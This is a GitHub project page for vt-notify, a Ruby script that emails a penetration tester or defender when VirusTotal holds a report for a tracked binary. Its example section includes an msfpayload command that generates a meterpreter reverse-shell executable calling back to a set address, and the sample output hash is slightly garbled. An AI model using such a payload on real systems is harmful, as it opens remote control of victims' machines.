<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <title>Virus Total Notify by AshtinBlanchard</title>
    <link rel="stylesheet" href="stylesheets/styles.css">
    <link rel="stylesheet" href="stylesheets/github-dark.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
    <script src="javascripts/respond.js"></script>
    <!--[if lt IE 9]>
      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <!--[if lt IE 8]>
    <link rel="stylesheet" href="stylesheets/ie.css">
    <![endif]-->
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

  </head>
  <body>
      <div id="header">
        <nav>
          <li class="fork"><a href="https://github.com/AshtinBlanchard/vt-notify">View On GitHub</a></li>
          <li class="downloads"><a href="https://github.com/AshtinBlanchard/vt-notify/zipball/master">ZIP</a></li>
          <li class="downloads"><a href="https://github.com/AshtinBlanchard/vt-notify/tarball/master">TAR</a></li>
          <li class="title">DOWNLOADS</li>
        </nav>
      </div><!-- end header -->

    <div class="wrapper">

      <section>
        <div id="title">
          <h1>Virus Total Notify</h1>
          <p>Recieve an email notification when VirusTotal has a copy of your binary</p>
          <hr>
          <span class="credits left">Project maintained by <a href="https://github.com/AshtinBlanchard">AshtinBlanchard</a></span>
          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/michigangraham">mattgraham</a></span>
        </div>

        <h1>
<a id="virus-total-notifier" class="anchor" href="#virus-total-notifier" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Virus Total Notifier</h1>

<p>This project was originally created to notify the user when Virus Total had a report for a specific binary (i.e. one used in a penetration test or otherwise) the penetration tester could be notified via log or email. It runs in an infinite loop and does not check files or hashes that have already been detected by the program; It does, however, continue to re-check hashes that haven't been detected.</p>

<p>This program can also be used as a detection mechanism. Target it towards your web-root or other sensitive directory and it will notify you when anything that has a report on Virus Total is added to your directory.</p>

<p>The script doesn't have anything OS specific in it, so it should be portable anywhere Ruby is installed.</p>

<h1>
<a id="usage" class="anchor" href="#usage" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Usage</h1>

<pre><code>Usage: vt-notify [options]
    -e EMAIL // email address of who to notify upon detection, will only log to file if not specified
    -m SMTPSERVER // smtp server to relay email through
    -s FILENAME // file name of binary to keep track of
    -S SHA1 // single SHA1 to keep track of
    -f FILENAME // file containing sha1 hashes of files to keep track of
    -d DIRECTORY // directory of binaries keep track of
    -a APIKEYFILENAME // file contianing API key hash on first line, defaults to apikey.txt
    -l LOGFILENAME // file to write/read positive entries to/from, defaults to results.log
    -i INTERVAL // how often VT is checked, defaults to every 10 minutes
    -h // this help screen
</code></pre>

<p>For example, the following takes all 500+ files in the hackarmoury repository, SHA1 hashes them and checks them against Virus Total. The ones that have been submitted (even those that have a 0 detection rate) are reported via email to <a href="mailto:justanotheruser@gmail.com">justanotheruser@gmail.com</a> via the Gmail email servers. </p>

<pre><code>./vt-notify.rb -d /opt/hackarmoury/ -e justanotheruser@gmail.com -m gmail-smtp-in.l.google.com
</code></pre>

<p>Another example is taking a freshly generated 'evil.exe' from Metasploit:</p>

<pre><code>./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.100 X &gt; evil.exe
</code></pre>

<p>And setting up vt-notify to just check on it, with the notifications going to the same gmail account, checking every 20 seconds:</p>

<pre><code>./vt-notify.rb -s evil.exe -e justanotheruser@gmail.com -m gmail-smtp-in.l.google.com -i 20
</code></pre>

<p>Then, acting as the incident responder, I upload the "found" malware to Virus Total and almost instantly:</p>

<pre><code>======================================
            RESULTS                   
======================================
Checked:     1
Not found:   1
Found:       0

check complete, sleeping for 20 seconds
4f4c103911eff1668199ff7fbce5e87rae1hee0d was found 35 out of 46 on 2012-12-28 08:29:59
======================================
            RESULTS                   
======================================
Checked:     1
Not found:   0
Found:       1
</code></pre>

<p>Hash lists are also supported in hash-per-line files (-f) and single SHA1 (-S), however I don't have the ability to support multiple singles on the command line (-S) or (-s)</p>

<h3>
<a id="credits" class="anchor" href="#credits" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Credits</h3>

<p>Credit to <a href="https://github.com/mubix">@mubix</a> for the original vt-notify script<br>
Credit to <a href="https://github.com/AshtinBlanchard">@ashtinblanchard</a> for bringing it forward</p>
      </section>

    </div>
    <!--[if !IE]><script>fixScale(document);</script><![endif]-->
    
  </body>
</html>
